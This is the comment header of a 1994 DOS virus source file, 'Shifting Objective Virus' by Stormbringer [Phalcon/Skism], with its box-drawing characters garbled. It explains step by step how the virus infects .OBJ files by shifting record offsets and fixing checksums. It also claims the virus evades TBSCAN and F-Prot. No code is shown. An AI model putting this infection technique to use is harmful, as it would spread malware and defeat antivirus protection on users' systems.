;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í»
;ï¿½  Shifting Objective Virus 3.0 (c) 1994 Stormbringer [Phalcon/Skism]  ï¿½
;ï¿½                                                                      ï¿½
;ï¿½  Memory Resident .OBJ Infector - No TBSCAN Flags, No F-Prot Alarms!  ï¿½
;ï¿½                                                                      ï¿½
;ï¿½  This virus breaks new bounds in viral technology, best I know }-)   ï¿½
;ï¿½It infects .OBJ files that are set up to compile to simple, stand-    ï¿½
;ï¿½alone .COM's.  The basic theory for this is the following:  It takes  ï¿½
;ï¿½the pre-set compiling points of the modules in the .OBJ and moves themï¿½
;ï¿½up in memory so Objective will have room to insert itself underneath. ï¿½
;ï¿½When the file is compiled the virus is at the beginning of the file,  ï¿½
;ï¿½and the original code follows BUT - the original code's memory offsetsï¿½
;ï¿½are what they were BEFORE the virus infected the .OBJ.  Therefore, allï¿½
;ï¿½Objective has to do when it runs is go memory resident, and shift the ï¿½
;ï¿½host code back down to where it starts at 100h in memory, and all is  ï¿½
;ï¿½well.                                                                 ï¿½
;ï¿½                                                                      ï¿½
;ï¿½  Object files are basically a set of linked lists or fields, each    ï¿½
;ï¿½with a three byte header.  The first byte is it's identity byte, whileï¿½
;ï¿½the following word is the size of the field - header.  The very last  ï¿½
;ï¿½byte of each record is a simple checksum byte - this can be gained    ï¿½
;ï¿½simply by adding up all of the bytes in the field save the three byte ï¿½
;ï¿½header and taking the negative (not reg/inc reg) so that the entire   ï¿½
;ï¿½field value + checksum = 0.  Each field type has it's own identity    ï¿½
;ï¿½value, but we are only concerned with a few right now.                ï¿½
;ï¿½                                                                      ï¿½
;ï¿½They are as follows:                                                  ï¿½
;ï¿½             80h  -  Starting field of a .OBJ file                    ï¿½
;ï¿½             8Ch  -  External definitions                             ï¿½
;ï¿½             8Ah  -  Ending field of a .OBJ file                      ï¿½
;ï¿½             A0h  -  Regular Code                                     ï¿½
;ï¿½             A2h  -  Compressed code (patterns/reiterated stuff)      ï¿½
;ï¿½                                                                      ï¿½
;ï¿½   In the A0h and A2h types of fields, there is one more thing that   ï¿½
;ï¿½concerns us - the three bytes after the field size in the header      ï¿½
;ï¿½are indicators of the location in memory the code will be at - the    ï¿½
;ï¿½second and third byte form the word we will be concerned with, which  ï¿½
;ï¿½is a simple offset from CS:0000 that the code will begin.  Since we   ï¿½
;ï¿½are dealing with .COM files and want to put our virus at the beginningï¿½
;ï¿½of the file, we set the position field of the virus to 100h and the   ï¿½
;ï¿½positions of all the other A0h and A2h fields to their old position   ï¿½
;ï¿½plus the virus size.  When the file is compiled, the virus will be    ï¿½
;ï¿½at the beginning and the host will follow.  Attaching the virus to    ï¿½
;ï¿½the .OBJ itself is simple enough - just save the 8Ah field in memory, ï¿½
;ï¿½and write FROM IT'S OLD BEGINNING a header for your virus, your       ï¿½
;ï¿½virus, then a checksum and the old 8Ah field.  At all times when      ï¿½
;ï¿½modifying fields, the checksums must be fixed afterwards.             ï¿½
;ï¿½                                                                      ï¿½
;ï¿½   For the rest of the techniques that may be useful, I suggest you   ï¿½
;ï¿½look at the following code for my Shifting Objective Virus.  I'd like ï¿½
;ï¿½to thank The Nightmare for his ideas on this when we sat around bored ï¿½
;ï¿½those days.  Greets go out to all of Phalcon/Skism, Urnst Kouch,      ï¿½
;ï¿½Mark Ludwig, TridenT, NuKE, and the rest of the viral community.      ï¿½
;ï¿½A special hello goes to Hermanni and Frisk.                           ï¿½
;ï¿½                                                                      ï¿½
;ï¿½                                           ï¿½  Stormbringer [P/S]      ï¿½
;ï¿½                                         ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½       ï¿½
;ï¿½                                           ï¿½                          ï¿½
;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¼